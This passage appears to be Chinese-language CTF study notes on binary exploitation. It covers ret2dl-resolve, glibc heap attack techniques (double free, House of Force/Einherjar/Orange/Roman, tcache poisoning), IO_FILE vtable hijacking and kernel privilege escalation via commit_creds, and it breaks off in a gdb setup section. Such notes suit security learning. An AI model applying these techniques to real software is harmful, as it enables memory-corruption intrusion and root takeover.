Stage3\uff1a\u5b9e\u9645\u4e0aStage2\u4e2dpush\u7684\u504f\u79fb\uff0c\u5c31\u662f\u76ee\u6807\u51fd\u6570\u5728.rel.plt\u8282\u4e2d\u7684\u504f\u79fb\u3002\u8fd9\u4e2astage\u4e2d\uff0c\u4f2a\u9020\u4e86write\u5728.rel.plt\u8282\u4e2d\u5bf9\u5e94\u7684\u8868\u9879\u3002\u8fd9\u4e2a\u8868\u9879\u6709\u4e24\u4e2a\u503c\uff0c\u7b2c\u4e00\u4e2a\u503c\u5bf9\u5e94\u7684\u662f\u51fd\u6570\u7684GOT\u8868\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u503cr->info\uff08\u4e0d\u662f\u5f88\u61c2\uff0c\u4f46\u662f\u5b83\u53f3\u79fb8\u4f4d\u5f97\u5230\u7684\u53eb\u7d22\u5f15\uff0c\u8fd9\u4e2a\u7d22\u5f15\u5bf9\u5e94\u7684\u662f.dynsym\u4e2d\u51fd\u6570\u6240\u5728\u7684\u7d22\u5f15\uff0c\u4f8b\u5982write\u7684\u503c\u662f0x607\uff0c\u53f3\u79fb8\u4f4d\u5f97\u5230\u7d22\u5f15\u5c31\u662f0x6\uff0c\u521a\u597d\u5bf9\u5e94\u5b83\u5728.dynsym\u4e2d\u7d22\u5f15\u662f6\u3002\u800c\u5b83\u76847\u4ee3\u8868\u7740\u5b83\u662fR_386_JUMP_SLOT\u8fd9\u4e2atype\uff09 Stage4\uff1a\u8fd9\u4e2astage\u4e2d\uff0c\u4f2a\u9020\u4e86\u51fd\u6570\u5728.dynsym\u8868\u4e2d\u7684\u9879\u3002\u5728stage3\u4e2d\u4f2a\u9020\u4e862\u4e2a\u503c\uff0c\u5176\u4e2d\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u503c\u627e\u5230\u51fd\u6570\u5728.dynsym\u4e2d\u7684\u7d22\u5f15\uff0c\u518d\u901a\u8fc7\u8fd9\u4e2a\u7d22\u5f15\u5bf9\u5e94\u7684\u8868\u9879A\uff0c\u53ef\u4ee5\u627e\u5230\u51fd\u6570\u5728.dynstr\u8868\u4e2d\u7684\u9879B\u3002\u8868\u9879A\u957f\u5ea6\u4e3a0x10\uff0c\u4f4e\u5730\u5740\u76844\u5b57\u8282\uff08st_name\uff09\u5b58\u7684\u662fB\u548c.dynstr\u8868\u5934\u7684\u504f\u79fb\u3002 Stage5\uff1a\u8fd9\u4e2astage\u548cstage4\u57fa\u672c\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2astage\u662f\u5728stage4\u7684\u57fa\u7840\u4e0a\u4f2a\u9020\u4e86.dynstr\u8868\u9879\u3002\u501f\u6b64\u6539\u53d8st_name\uff0c\u5f15\u5bfc\u5230\u81ea\u5df1\u5199\u7684\u51fd\u6570\u540d\u4e2d\uff0c\u672c\u4f8b\u662f\u201dwrite\\x00\u201d Stage6\uff1a\u548cstage5\u540c\u7406\uff0c\u5b9e\u6218\u3002\u628a\u5b57\u7b26\u4e32\u6539\u4e3a\u201dsystem\\x00\u201d\uff0c\u5373\u53ef\u89e3\u6790\u6210system\u51fd\u6570\u3002 \u9644\u5f55\uff1a roputils\u5de5\u5177\uff1a https://github.com/inaz2/roputils \u5806 \u00b6 \u57fa\u672c\u77e5\u8bc6\uff1a \u00b6 \u5f53\u8c03\u7528free\u51fd\u6570\u7684\u65f6\u5019 __free_hook \u4e0d\u4e3aNULL\u4f1a\u4f18\u5148\u8c03\u7528 __free_hook \u51fd\u6570\u52ab\u6301free\u51fd\u6570\u3002\u5f53GOT\u8868\u4e0d\u80fd\u4fee\u6539\u65f6\uff0c\u53ef\u8003\u8651\u4fee\u6539 __free_hook \u6307\u5411\u7684\u5185\u5bb9\u4e3a\u60f3\u8981\u7684\u51fd\u6570(\u5982system)\uff0c\u8981\u88ab\u91ca\u653e\u7684\u5806\u5730\u5740\u4e3a\u53c2\u6570\uff0c\u8fbe\u5230free(addr)=system(addr)\u7684\u6548\u679c\u3002\u4fee\u6539 __malloc_hook \u540e\uff0c\u53ef\u8003\u8651\u901a\u8fc7\u8fde\u7eed\u91ca\u653e\u540c\u4e00\u5806\u5757\uff08double free\uff09\u8fdb\u884c\u89e6\u53d1\uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\uff0c\u4f46\u4f1a\u8c03\u7528backtrace_and_map\u51fd\u6570\u4e4b\u540e\u8c03\u7528malloc\u51fd\u6570\u3002 \u5806\u57fa\u7840\u5b66\u4e60\u8d44\u6599\uff1a https://www.cnblogs.com/alisecurity/p/5486458.html\uff0chttps://www.cnblogs.com/alisecurity/p/5520847.html chunk\u52a0\u5165unsorted bin\u7684\u60c5\u51b5\uff1a \u2460\u91ca\u653esmall chunk\u65f6\uff0c\u5982\u679c\u80fd\u8fdb\u884c\u5408\u5e76\uff0c\u5c31\u5c06\u80fd\u5408\u5e76\u7684\u4ecesmall bin\u4e2d\u79fb\u9664\uff0c\u5c06\u65b0\u7684chunk\u52a0\u5165\u5230unsorted bin\u4e2d\u3002\uff08large bin\u540c\u7406\uff09 \u2461\u5982\u679clarge bin\u6700\u5927chunk size\u5927\u4e8e\u7528\u6237\u8bf7\u6c42\u7684size\uff0c\u5219\u62c6\u5206\u4e3a\u4e24\u5757\uff0c\u524d\u8005\u7ed9\u7528\u6237\uff0c\u540e\u8005\u52a0\u5165\u5230unsorted bin\u3002 fast bin\uff1aLIFO \uff1b small bin\uff1a FIFO fast bin\u4f7f\u7528\u5355\u94fe\u8868\uff0c\u5176\u4ed6\u5faa\u73af\u53cc\u94fe\u8868 mmap\u5f97\u5230\u7684\u5730\u5740\u662f\u8ddflibc\u6709\u5173\u7684\uff0c\u53ef\u4ee5\u5728\u5173\u95edASLR\u7684\u65f6\u5019\u6c42\u504f\u79fb\u3002\u7136\u540e\u518d\u5229\u7528\u8fd9\u4e2a\u504f\u79fb\uff0c\u53ef\u4ee5\u5728\u5f00\u542fASLR\u7684\u65f6\u5019\u6c42\u5f97libc\u57fa\u5740\u3002 \u5411\u540e\u5408\u5e76\uff1a\u628a\u76f8\u90bb\u7684\u4f4e\u5730\u5740\u7684chunk\u5408\u5e76 32\u4f4d\u7cfb\u7edf\u4e2d\uff0c\u7528\u6237\u7684\u8bf7\u6c42\u572816bytes\u523064bytes\u4f1a\u88ab\u5206\u914d\u5230fastbin\u4e2d\uff1b64\u4f4d\u7cfb\u7edf\u4e2d\uff0c\u7528\u6237\u7684\u8bf7\u6c42\u572832bytes\u5230128bytes\u4f1a\u88ab\u5206\u914d\u5230fastbin\u4e2d \u4f2a\u9020fake chunk\u65f6\uff0c\u8981\u6ce8\u610f\u4f2a\u9020next chunk\u7684prev_size\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\uff08House of einherjar\u91cc\u9762\u6709\u8be6\u7ec6\u63d0\u5230\uff09 \u5f53\u7533\u8bf7\u7684\u5806\u5757\u5927\u4e8e\u5f53\u524d\u7684top chunk size\u4e14\u5c0f\u4e8e\u7528mmap\u5206\u914d\u7684\u9608\u503c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5c06\u539f\u6765\u7684top chunk \u653e\u5230**unsorted bin**\u4e2d\uff0c\u540c\u65f6\u5206\u914d\u65b0\u7684\u8f83\u5927\u7684top chunk\u51fa\u6765\u3002 define MALLOC_ALIGNMENT (2 * SIZE_SZ) \u00b6 define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) \u00b6 tcache_entry\u4e2d\uff0cnext\u57df\u76f4\u63a5\u6307\u5411user data\uff0c\u800c\u4e0d\u662f\u50cffastbin\u90a3\u6837\u6307\u5411chunk\u5f00\u5934 calloc\u4e0d\u4f1a\u5206\u914dtcache\u4e2d\u7684\u5806 Unlink: \u00b6 \u5728\u535a\u5ba2\u4e0a\u5199 UAF\uff1a \u00b6 \u5806\u88ab\u91ca\u653e\uff0c\u4f46\u6307\u9488\u672a\u88ab\u7f6enull Fastbin double free: \u00b6 \u901a\u8fc7\u6784\u9020\u51faA->B->A\u7684fastbin\uff0c\u7533\u8bf7A\uff0c\u4ece\u800c\u53ef\u4ee5\u4fee\u6539A\u7684fd\u57df\uff0c\u7b2c\u4e8c\u6b21\u518d\u7533\u8bf7A\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u4fee\u6539\u60f3\u8981\u7684\u5730\u5740\u3002\u8981\u6ce8\u610f\u5bf9size\u7684\u68c0\u67e5\uff0c\u9700\u8981\u7b26\u5408\u5f53\u524dbin\u7684size House of spirit: \u00b6 \u4f2a\u9020\u5757\uff0cfree\u6389\u518d\u7533\u8bf7\uff0c\u4ece\u800c\u5b9e\u73b0\u5206\u914d\u5230\u7684\u5806\u5757\u662f\u6211\u4eec\u4f2a\u9020\u7684\u5806\u5757\u3002\u9700\u8981\u6ce8\u610fsize\u7b26\u5408\u8981\u6c42\uff0c\u5757\u5730\u5740\u5bf9\u9f50\uff0c ISMMAP \u4e0d\u80fd\u4e3a1 Chunk overlap: \u00b6 free\u6389\u4e00\u4e2aunsorted chunk A\uff0c\u8fd9\u6837\u5b83\u4e0b\u4e00\u4e2achunk B\uff08\u7269\u7406\u9ad8\u5730\u5740\u76f8\u90bb\uff09\u7684prev_size\u5c31\u662f\u8fd9\u4e2aA\u7684size \u628aA\u7684size\u6539\u5c0f\uff0c\u7136\u540e\u5206\u914d\u81f3\u5c11\u4e24\u6b21\uff08\u5047\u8bbe\u5206\u914d\u4e24\u6b21\uff0c\u628a\u539f\u6765\u7684A\u62c6\u5206\u5f97\u5230C\u548cD\uff09\uff0c\u7531\u4e8e\u6539\u5c0f\u4e86\uff0c\u56e0\u6b64\u5206\u914d\u65f6\u5e76\u4e0d\u4f1a\u5f71\u54cd\u5230B\u7684prev_size\u548csize\u7684prev_in_use\u4f4d\uff0c\u5f53\u7136\u8fd9\u91cc\u8981\u6ce8\u610f\u6784\u9020\u4e0bfake chunk\u9632\u6b62\u5206\u914dC\u65f6\u88abcheck free C\uff0cfree B\uff08\u5728free B\u7684\u65f6\u5019\uff0c\u56e0\u4e3aprev_size\u6ca1\u6709\u6539\u8fc7\uff0c\u8fd8\u662fA\u7684size\uff0c\u56e0\u6b64\u76f8\u5f53\u4e8e\u628aA\u548cB\u5408\u5e76\u8d77\u6765\u4e86\uff0c\u5f97\u5230E\uff09 E\u8fdb\u5165unsorted bin\uff0c\u4f46\u663e\u7136D\u4e5f\u5728E\u4e2d\uff0c\u5c31\u6709UAF\uff0c\u4e4b\u540e\u5c31\u5e38\u89c4\u5229\u7528\u4e86 Unsorted bin attack: \u00b6 \u4e0d\u6ee1\u8db3fastsize\u7684chunk\u88abfree\u540e\u8fdb\u5165unsorted bin\uff0c\u5f53\u4eceunsorted bin\u4e2d\u53d6\u51fa\u4e00\u4e2achunk p\u65f6\uff0c\u4f1a\u628ap->bk->fd\u7f6e\u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u6570\uff08main_arena\u4e2d\u7684\u4e00\u4e2a\u5730\u5740\uff09\uff0c\u56e0\u6b64\u5982\u679c\u80fd\u6539bk\u5c31\u80fd\u628a\u67d0\u4e2a\u5730\u5740\u7684\u503c\u8bbe\u4e3a\u5f88\u5927\uff0c\u4e00\u822c\u53ef\u4ee5\u6539global_max_fast Small bin attack(House of Lore): \u00b6 \u5229\u7528\u6761\u4ef6\uff1a\u2460\u53ef\u4ee5\u63a7\u5236\u5728small bin\u4e2d\u7684chunk\u7684bk\u6307\u9488 \u2461\u53ef\u4ee5\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e\u7684fd\u3001bk\u6307\u9488 Small bin\u7684check\u68c0\u67e5\u4e86victim->bk->fd==victim\uff0cvictim\u4e3a\u5f85unlink\u7684\u5806\uff0c\u628abk\u6539\u4e3a\u60f3\u8981\u7684\u4f4d\u7f6efake chunk\uff0c\u540c\u65f6\u90a3\u4e2a\u4f4d\u7f6e\u7684fd\u6307\u9488\u6539\u4e3avictim\uff0c\u5373\u53ef\u7ed5\u8fc7\u7b2c\u4e00\u6b21check\uff0c\u5206\u914d\u5230victim\u3002\u7136\u540efake chunk\u7684bk\u8981\u6307\u5411\u4e00\u4e2a\u53ef\u63a7\u5236\u7684\u5730\u65b9\uff0c\u8ba9\u8be5\u5904\u7684fd\u4e3afake chunk\uff0c\u5373\u53ef\u7ed5\u8fc7\u7b2c\u4e8c\u6b21check\uff0c\u5206\u914d\u5230fake chunk\u3002 if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } Large bin attack: \uff08\u8fd8\u4e0d\u592a\u61c2\uff09 \u00b6 \u53c2\u8003\uff1a https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/ \u63a7\u5236\u4e00\u4e2aunsorted chunk\u548c\u4e00\u4e2alarge chunk\uff0cunsorted chunk\u63a7\u5236bk\uff0clarge chunk\u63a7\u5236bk\u548cbk_nextsize\u3002\uff08\u4e0b\u9762\u8bf4\u7684\u662funsorted chunk>large chunk\uff09 \u5148\u628aunsorted chunk\u7684bk\u6539\u4e3a\u60f3\u63a7\u5236\u7684\u5730\u5740\u9644\u8fd1\uff0c\u8981\u8ba9size\u57df\u7b26\u5408\u4f60\u60f3\u63a7\u5236\u7684\u5927\u5c0f\uff08\u4e5f\u662f\u63a5\u4e0b\u6765\u4f60\u7533\u8bf7\u7684\u5927\u5c0f\uff09\uff0c\u800c\u8fd9\u4e2aunsorted chunk\u4e0d\u80fd\u5b8c\u7f8e\u7b26\u5408\u4f60\u63a5\u4e0b\u6765\u7533\u8bf7\u7684\u5927\u5c0f\uff0c\u4f7f\u5f97unsorted chunk\u56de\u5230\u5bf9\u5e94large bin\u3002 \u63a5\u7740\u56e0\u4e3a\u8fd9\u4e2aunsorted chunk\u8981\u56de\u5230large bin\uff0c\u5c31\u8981\u53d1\u751f\u4eceunsorted bin\u4e2dunlink\uff0c\u6b64\u65f6\u56e0\u4e3a\u4e0b\u56fe\u4f1a\u628a\u63a7\u5236\u7684\u5730\u65b9\u7684fd\u57df\u6539\u4e3a\u4e00\u4e2alibc\u5730\u5740\u3002 \u7136\u540e\u628a\u8fd9\u4e2aunsorted chunk\u52a0\u5165\u5230large bin\u4e2d\uff0c\u4f1a\u89e6\u53d1\u4e0b\u56fe\u63d2\u5165\u5230large bin\u7684\u4ee3\u7801\u3002\u4f1a\u628a\u63a7\u5236\u7684\u5730\u65b9\u7684bk_nextsize\u6539\u4e3a\u5806\u5730\u5740\u3002 \u4e4b\u540e\u8fd8\u6709\u4e00\u4e9b\u4ee3\u7801\uff0c\u5982\u4e0b\u56fe\uff0c\u53c8\u662f\u4efb\u610f\u5730\u5740\u5199\u5806\u5730\u5740\u3002\u8fd9\u91cc\u7684bck->fd\u8981\u8ba9\u5b83\u6539\u5230size\u57df\uff0c\u5355\u5b57\u8282\uff0c\u4f7f\u5f97\u5b83\u6ee1\u8db3\u4f60\u60f3\u8981\u7684\u5927\u5c0f\u3002 \u6700\u540e\u5206\u914d\u5f97\u5230\u7684\u5c31\u662f\u4f60\u5728unsorted chunk\u7684bk\u57df\u91cc\u4f2a\u9020\u7684\u90a3\u4e2a\u5806\u3002 House of force: \u00b6 \u5229\u7528\u6761\u4ef6\uff1a\u2460\u53ef\u4ee5\u63a7\u5236top chunk\u7684size\u57df \u2461\u53ef\u4ee5\u7533\u8bf7\u4efb\u610f\u5927\u5c0f\u7684\u5806 \u8bbefake chunk\u5730\u5740\u4e3aA\uff0c\u5f53\u524dtop chunk\u5730\u5740\u4e3aB\u3002\u8fd9\u65f6\u504f\u79fb\u4e3aA-B\u3002\u63a5\u4e0b\u6765\u8981\u8ba1\u7b97\u7533\u8bf7\u7684\u5806\u5927\u5c0freq\u3002\u6839\u636eglibc\u4ee3\u7801\uff0c\u9700\u8981\u6ee1\u8db3\uff1areq+SIZE_SZ+MALLOC_ALIGN_MASK=\u504f\u79fb=A-B\u3002 \u8fd9\u65f6req=A-B-SIZE_SZ-MALLOC_ALIGN_MASK\uff0c\u7136\u540emalloc(req)\u3002\u8fd9\u65f6top chunk\u5c31\u6307\u5411\u4e86\u4f60\u60f3\u8981\u7684\u5730\u5740A\u3002\u518d\u7533\u8bf7\u5c31\u4f1a\u8fd4\u56de\u5730\u5740\u4e3aA\u7684chunk\u3002 House of Einherjar: \u00b6 \u5229\u7528\u6761\u4ef6\uff1a\u2460\u53ef\u4ee5\u63a7\u52361\u4e2a\u975efast chunk A\u7684prev size\u57df \u2461\u53ef\u4ee5\u8ba9A\u7684prev_in_use\u57df\u4e3a0 \u539f\u7406\u662f\u5229\u7528**unlink**\u3002\u628aA\u7684prev_in_use\u57df\u7f6e0\uff0c\u5728free A\u7684\u65f6\u5019\u4f1a\u89e6\u53d1\u540e\u5411\u5408\u5e76\uff0c\u628aA\u548cA-prev size\u7684fake chunk\u5408\u5e76\u3002\u5176\u4e2d\u7684check\u548cunlink\u65f6\u7684check\u4e00\u6837\uff1a if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \u9700\u8981\u628afake chunk\u7684fd\u548cbk\u6539\u4e3a\u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\u3002 PS\uff1aunlink\u4e2d\u5bf9size\u548cprev_size\u6709\u5982\u4e0b\u9a8c\u8bc1\uff1a if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) malloc_printerr ( \"corrupted size vs. prev_size\" ); \u6240\u4ee5\u53ea\u9700P+size\uff0c\u5c31\u662fglibc\u8ba4\u4e3a\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u57df\uff0c\u7b49\u4e8eP\u7684size\u57df\u5373\u53ef\u3002 House of Orange: \u00b6 \u5229\u7528\u6761\u4ef6\uff1a\u5f53\u7a0b\u5e8f\u4e2d\u6ca1\u6709free\u51fd\u6570\u65f6\u4f7f\u7528\uff08\u9700\u8981\u80fd\u6539top chunk size\uff1f\u611f\u89c9\u4e0d\u4e00\u5b9a\uff0c\u4f46\u8d44\u6599\u8fd9\u4e48\u5199\uff09 \u5f53top chunk\u4e0d\u80fd\u6ee1\u8db3\u5f53\u524d\u5206\u914d\u7684\u9700\u6c42\u65f6\uff0c\u4f1a\u7528brk\u62d3\u5c55\u5806\uff0c\u4e4b\u524d\u7684top chunk\u5c31\u4f1a\u88ab\u653e\u5165unsorted bin\u4e2d \u6ce8\u610f\u4e8b\u9879\uff1a\u2460\u4f2a\u9020\u7684top chunk size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875\uff08\u5373\u540e3\u4f4d\uff09 \u2461size\u8981\u5927\u4e8eMINSIZE \u2462size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size+MINSIZE \u2463size\u7684prev_in_use\u4f4d\u4e3a1 House of Roman: \u00b6 \u5229\u7528\u6761\u4ef6\uff1a\u2460\u65e0\u6cd5leak \u2461\u5b58\u5728UAF\u6f0f\u6d1e \u2462\u53ef\u4ee5\u751f\u6210fast chunk\u548cunsorted chunk \u5148\u901a\u8fc7fast bin attack\uff0c\u4f7f\u5f97fast chunk\u7684fd\u57df\u5b58\u6709main_arena\u76f8\u5173\u7684\u5730\u5740\uff0c\u901a\u8fc7\u6539\u4f4e\u5b57\u8282\uff0c\u7533\u8bf7\u5230 __malloc_hook-0x23 \u4f5c\u4e3afake chunk\u3002\u7136\u540e\u901a\u8fc7unsorted bin attack\uff0c\u4f7f\u5f97unsorted chunk\u7684bk\u57df\u5b58\u6709main_arena\u76f8\u5173\u5730\u5740\uff0c\u901a\u8fc7\u6539\u4f4e\u5b57\u8282\uff0c\u628a __malloc_hook \u7684\u503c\u6539\u4e3a\u4e00\u4e2a\u548cmain_arena\u76f8\u5173\u7684\u5730\u5740\u3002\u6700\u540e\u5229\u7528\u524d\u9762fast bin attack\u5f97\u5230\u7684fake chunk\uff0c\u6539\u4f4e\u5b57\u8282\uff0c\u628amain_arena\u76f8\u5173\u6539\u6210one_gadget\u3002\u6700\u540edouble free\u89e6\u53d1one_gadget\uff0c\u9009\u53d6rsp+0x50\u90a3\u4e2a\u6210\u529f\u7387\u8f83\u9ad8\u3002 Tcache Attack: \u00b6 tcache poisoning: \u00b6 \u548cfast bin attack\u7c7b\u4f3c\uff0c\u6539fd\uff0c\u4f46\u6ca1\u6709\u4e86size\u7684\u9650\u5236 tcache dup: \u00b6 2.27\uff1adouble free\uff0c\u4f46\u6ca1\u6709\u4efb\u4f55\u68c0\u67e5\uff0c\u53ef\u4ee5\u76f4\u63a5double free 2.29\uff1a\u5bf9double free\u52a0\u5165\u68c0\u67e5\uff0c\u5982\u679c\u53d1\u73b0\u5728\u5f53\u524dtcache\u4e2d\u5df2\u6709\u5f85free\u7684\u5806\uff0c\u5219\u62a5\u9519\uff1b\u4f46\u5982\u679c\u540c\u4e00\u4e2a\u5806\u5728\u4e24\u4e2atcache\u4e2d\u5b58\u5728\u4e0d\u4f1a\u62a5\u9519 IO_FILE\u5229\u7528 \u00b6 \u57fa\u7840\u77e5\u8bc6\uff1a \u00b6 \u7a0b\u5e8f\u5bf9\u6bcf\u4e2a\u6587\u4ef6\u6d41\u751f\u6210\u4e00\u4e2aFILE\u7ed3\u6784\u3002\u5bf9\u6240\u6709FILE\u7ed3\u6784\u7528\u94fe\u8868\u8fde\u63a5\uff0c\u94fe\u8868\u5934\u7528_IO_list_all\u8868\u793a\u3002\u6807\u51c6IO\u5e93\uff0c\u7a0b\u5e8f\u542f\u52a8\u65f6\u81ea\u52a8\u6253\u5f00stdin\u3001stdout\u3001stderr\u4e09\u4e2a\u6587\u4ef6\u6d41\uff0c\u8fd9\u4e09\u4e2a\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u3002 c struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } 32\u4f4d\u4e0bvtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4f4d0xd8 ```c void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; ``` fread\u8c03\u7528\uff1aIO_file_xsgetn fwrite\u8c03\u7528\uff1aIO_file_xsputn\uff0cIO_file_overflow\uff0c_IO_file_write fopen\u8c03\u7528 fclose\u8c03\u7528\uff1aIO_file_finish printf/puts\u8c03\u7528\uff1aIO_file_xsputn\uff0cIO_file_overflow\uff0c_IO_file_write vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012. \u7a0b\u5e8f\u8c03\u7528 exit \u540e\uff0c\u4f1a\u904d\u5386 _IO_list_all \uff0c\u8c03\u7528 _IO_2_1_stdout_ \u4e0b\u7684 vatable \u4e2d _setbuf \u51fd\u6570\u3002 \u5f53 glibc \u68c0\u6d4b\u5230\u5185\u5b58\u9519\u8bef\u65f6\uff0c\u4f1a\u4f9d\u6b21\u8c03\u7528\u8fd9\u6837\u7684\u51fd\u6570\u8def\u5f84\uff1amalloc_printerr -> libc_message->__GI_abort -> _IO_flush_all_lockp -> _IO_OVERFLOW IO_FILE_to_leak \u00b6 \u6539 _IO_2_1_stdout_ \u7684flag\u4e3a0xfbad1800\uff0c\u7136\u540e\u540e\u9762\u52a0p64(0)*3+'\\x00'\uff0c\u6539\u5c0f _IO_write_base \uff0c\u4ece\u800c\u53ef\u4ee5\u591a\u8f93\u51fa\u4e00\u70b9\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62eclibc\u5730\u5740\uff0c\u53ef\u4ee5\u627e\u5230 _IO_file_jumps \u5185\u6838Pwn \u00b6 \u73af\u5883\u914d\u7f6e \u00b6 \u73af\u5883\u914d\u7f6e\u53c2\u8003\uff1a http://blog.eonew.cn/archives/1162 https://23r3f.github.io/2019/05/15/kernel%20pwn%E5%88%9D%E6%8E%A2/ \u5185\u6838\u7f16\u8bd1\uff1a make bzImage busybox\u7f16\u8bd1\uff1a make install \u5f97\u5230_install\u6587\u4ef6\u5939\uff0c\u624b\u52a8\u6dfb\u52a0\u4e00\u4e9b\u7cfb\u7edf\u6587\u4ef6\u5939\u548cinit\u521d\u59cb\u5316\u811a\u672c \u5982\u679c\u9700\u8981\u52a0\u53ef\u6267\u884c\u6587\u4ef6\uff08ELF\uff09\uff0c\u4e5f\u662f\u653e\u5728_install\u76ee\u5f55\u4e0b \u6253\u5305\uff1a find . | cpio -o --format=newc > ./rootfs.img qemu\u542f\u52a8\uff1a \u628a\u7f16\u8bd1\u597d\u7684\u5185\u6838bzImage\u548cbusybox\u6253\u5305\u597d\u7684\u6587\u4ef6\u7cfb\u7edf\u653e\u5230\u540c\u4e00\u6587\u4ef6\u5939\u4e0b\uff0c\u4e4b\u540e\u6267\u884cshell\u547d\u4ee4\uff08\u4e3a\u65b9\u4fbf\u76f4\u63a5\u653e\u5230.sh\u6587\u4ef6\u4e2d\uff09 sh\uff1a #!/bin/sh qemu-system-x86_64 \\ -m 64M \\ -kernel ./bzImage \\ -initrd ./rootfs.img \\ -append \"root=/dev/ram rw oops=panic panic=1 kalsr\" \\ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\ -monitor /dev/null \\ -smp cores=2,threads=1 \\ -cpu kvm64,+smep \\ #-S \u542f\u52a8gdb\u8c03\u8bd5 #-gdb tcp:1234 \u7b49\u5f85gdb\u8c03\u8bd5 \u547d\u4ee4 \u00b6 dmesg\uff1a\u5f00\u673a\u4fe1\u606f\uff08 /proc/sys/kernel/dmesg_restrict \u4e3a1\u5219\u4e0d\u80fd\u8f93\u51fa\uff09 /proc/kallsyms \uff1a\u4fdd\u5b58\u5730\u5740\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u83b7\u53d6commit_creds\u548cprepare_kernel_creds\u7684\u5730\u5740\uff08 /proc/sys/kernel/kptr_restrict \u4e3a1\u5219\u4e0d\u80fd\u8f93\u51fa\uff09 \u6267\u884c commit_creds(prepare_kernel_cred(0)) \u5373\u53ef\u83b7\u5f97 root \u6743\u9650 gdb\u8c03\u8bd5glibc \u00b6 sudo apt-get install glibc-source sudo apt-get install libc6-dbg sudo tar -xf /usr/src/glibc/glibc-2.23.tar.xz \u5373\u53ef \u5728gdb\u63d0\u793a\u7b26\u4e0b\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a pwndbg> directory /usr/src/glibc/glibc-2.23/malloc/ pwndbg> b _int_malloc\uff08\u8981\u65ad\u7684\u51fd\u6570\uff09 \u5982\u679c\u51fa\u73b0 Function \"_int_malloc\" not defined. 